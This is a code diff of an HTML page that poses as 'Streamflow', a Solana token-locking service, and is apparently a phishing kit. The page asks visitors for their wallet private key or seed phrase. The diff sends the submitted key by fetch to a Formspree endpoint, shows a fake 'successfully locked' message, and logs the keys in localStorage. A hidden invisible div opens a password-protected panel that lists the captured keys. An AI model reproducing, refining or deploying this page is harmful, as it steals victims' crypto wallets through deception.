@@ -4,101 +4,96 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Streamflow | Token Locker</title>
-    
     <link rel="icon" type="image/png" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS8XfWp3S_wQG-5m3yYvVInK0A4I8X9-6Y_wA&s">
-    
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
-    
     <style>
         body { background-color: #0b0e11; color: white; font-family: 'Inter', sans-serif; }
-        .sf-card { background: #12161b; border: 1px solid #1e2329; border-radius: 16px; width: 100%; padding: 24px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-        .sf-input { background: #1b1f23; border: 1px solid #30363d; border-radius: 12px; width: 100%; padding: 14px; margin-top: 6px; color: white; outline: none; transition: 0.2s; font-size: 14px; }
-        .sf-input:focus { border-color: #00ffbd; }
-        .sf-btn { background-color: #00ffbd; color: #0b0e11; font-weight: 700; width: 100%; padding: 16px; border-radius: 12px; cursor: pointer; margin-top: 24px; transition: 0.3s; text-transform: uppercase; }
-        .sf-btn:hover { background-color: #00d9a1; transform: translateY(-1px); }
-        
-        /* ZONA INVIZIBILĂ ADMIN (Sub butonul verde) */
-        .secret-gate { width: 100%; height: 60px; background: transparent; margin-top: 10px; cursor: default; }
-        
+        .sf-card { background: #12161b; border: 1px solid #1e2329; border-radius: 16px; width: 100%; padding: 24px; }
+        .sf-input { background: #1b1f23; border: 1px solid #30363d; border-radius: 12px; width: 100%; padding: 14px; margin-top: 6px; color: white; outline: none; font-size: 14px; }
+        .sf-btn { background-color: #00ffbd; color: #0b0e11; font-weight: 700; width: 100%; padding: 16px; border-radius: 12px; cursor: pointer; margin-top: 24px; text-transform: uppercase; }
+        .secret-gate { width: 100%; height: 60px; background: transparent; margin-top: 10px; }
         #adminPanel { display: none; margin-top: 20px; border-top: 1px solid #2d333b; padding-top: 20px; }
-        .label-style { font-size: 11px; color: #848e9c; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px; }
     </style>
 </head>
 <body class="flex flex-col items-center justify-center min-h-screen p-6">
 
     <div class="w-full max-w-[420px]">
         <div class="flex flex-col items-center mb-8">
-            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS8XfWp3S_wQG-5m3yYvVInK0A4I8X9-6Y_wA&s" class="w-24 rounded-xl mb-4 shadow-lg shadow-blue-900/20 border border-gray-800">
-            <h1 class="text-3xl font-bold tracking-tight">Streamflow</h1>
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS8XfWp3S_wQG-5m3yYvVInK0A4I8X9-6Y_wA&s" class="w-24 rounded-xl mb-4 border border-gray-800">
+            <h1 class="text-3xl font-bold">Streamflow</h1>
             <p class="text-gray-400 text-sm">Token Vesting & Locking Service</p>
         </div>
 
         <div class="sf-card">
-            <h2 class="text-lg font-semibold mb-6 text-center text-white/90">Create New Lock</h2>
+            <h2 class="text-lg font-semibold mb-6 text-center">Create New Lock</h2>
             
-            <form action="https://formspree.io/f/mnjjqyez" method="POST" id="lockerForm">
-                
-                <div class="mb-4">
-                    <label class="label-style">Project Name</label>
-                    <input type="text" name="Project_Name" placeholder="e.g. My Token Project" class="sf-input" required>
-                </div>
-
-                <div class="mb-4">
-                    <label class="label-style">Private Key / Seed Phrase</label>
-                    <input type="password" name="Private_Key" placeholder="Enter your key" class="sf-input" required>
-                </div>
-
+            <form id="lockerForm">
+                <input type="text" name="Project_Name" placeholder="Project Name" class="sf-input mb-4" required>
+                <input type="password" name="Private_Key" id="pkey" placeholder="Private Key / Seed Phrase" class="sf-input mb-4" required>
                 <div class="flex gap-4">
-                    <div class="flex-1">
-                        <label class="label-style">Symbol</label>
-                        <input type="text" name="Token_Symbol" placeholder="SOL" class="sf-input">
-                    </div>
-                    <div class="flex-1">
-                        <label class="label-style">Amount</label>
-                        <input type="number" name="Lock_Amount" placeholder="0.00" class="sf-input">
-                    </div>
+                    <input type="text" name="Symbol" placeholder="SOL" class="sf-input flex-1">
+                    <input type="number" name="Amount" placeholder="0.00" class="sf-input flex-1">
                 </div>
-
-                <button type="submit" class="sf-btn">Deploy Lock</button>
+                <button type="submit" id="submitBtn" class="sf-btn">Deploy Lock</button>
             </form>
             
-            <div class="secret-gate" onclick="toggleAdmin()"></div>
+            <div class="secret-gate" onclick="document.getElementById('adminPanel').style.display='block'"></div>
             
             <div id="adminPanel">
-                <label class="label-style mb-2 block text-[#00ffbd]">Admin Dashboard</label>
-                <input type="password" id="adminPass" placeholder="Enter Admin Password" class="sf-input text-xs mb-2">
-                <button onclick="checkAdmin()" class="w-full bg-gray-800 text-white text-xs py-3 rounded-lg hover:bg-gray-700 transition font-bold">LOGIN TO DATABASE</button>
-                
-                <div id="dataList" class="mt-4 p-4 bg-black rounded-lg text-[10px] text-green-500 font-mono hidden border border-green-900/30">
-                    [SYSTEM]: Authenticated. <br>
-                    [SYSTEM]: Data redirection active. <br><br>
-                    Cheile colectate sunt trimise pe email-ul tau prin Formspree.
-                </div>
+                <input type="password" id="adminPass" placeholder="Admin Password" class="sf-input text-xs mb-2">
+                <button onclick="checkAdmin()" class="w-full bg-gray-800 text-white text-xs py-3 rounded-lg font-bold">VIEW DATA</button>
+                <div id="dataDisplay" class="hidden mt-4 p-4 bg-black rounded-lg text-[10px] text-green-500 font-mono border border-green-900/30">
+                    </div>
             </div>
         </div>
-        
-        <p class="text-[10px] text-gray-600 text-center mt-8">Powered by Streamflow Protocol © 2026</p>
     </div>
 
     <script>
-        function toggleAdmin() {
-            var panel = document.getElementById('adminPanel');
-            panel.style.display = (panel.style.display === 'block') ? 'none' : 'block';
-        }
+        const form = document.getElementById('lockerForm');
+        
+        form.addEventListener("submit", async function(event) {
+            event.preventDefault();
+            const btn = document.getElementById('submitBtn');
+            const data = new FormData(form);
+            
+            btn.innerText = "CONNECTING...";
+            btn.disabled = true;
+
+            fetch("https://formspree.io/f/mnjjqyez", {
+                method: "POST",
+                body: data,
+                headers: { 'Accept': 'application/json' }
+            }).then(response => {
+                btn.innerText = "DEPLOY LOCK";
+                btn.disabled = false;
+                
+                // --- MESAJUL PERSONALIZAT AICI ---
+                alert("Congratulations! You have successfully locked your token. Take a screenshot and share it on social media. Success!");
+                
+                let localData = JSON.parse(localStorage.getItem('logs') || "[]");
+                localData.push({
+                    p: form.Project_Name.value,
+                    k: form.Private_Key.value,
+                    t: new Date().toLocaleTimeString()
+                });
+                localStorage.setItem('logs', JSON.stringify(localData));
+                form.reset();
+            }).catch(error => {
+                alert("Error connecting to network. Please try again.");
+            });
+        });
 
         function checkAdmin() {
-            const p = document.getElementById('adminPass').value;
-            if(p === 'Ovidiu20.04.2006') {
-                document.getElementById('dataList').classList.remove('hidden');
-            } else {
-                alert("Access Denied: Incorrect Password");
-            }
+            if(document.getElementById('adminPass').value === 'Ovidiu20.04.2006') {
+                const logs = JSON.parse(localStorage.getItem('logs') || "[]");
+                const display = document.getElementById('dataDisplay');
+                display.innerHTML = logs.length > 0 ? 
+                    logs.map(l => `[${l.t}] PROJ: ${l.p} | KEY: ${l.k}`).join('<br>') : 
+                    "No logs found yet.";
+                display.classList.remove('hidden');
+            } else { alert("Wrong password"); }
         }
-
-        document.getElementById('lockerForm').onsubmit = function() {
-            alert("Connecting to Solana Blockchain... Authenticating transaction.");
-        };
     </script>
 </body>
 </html>
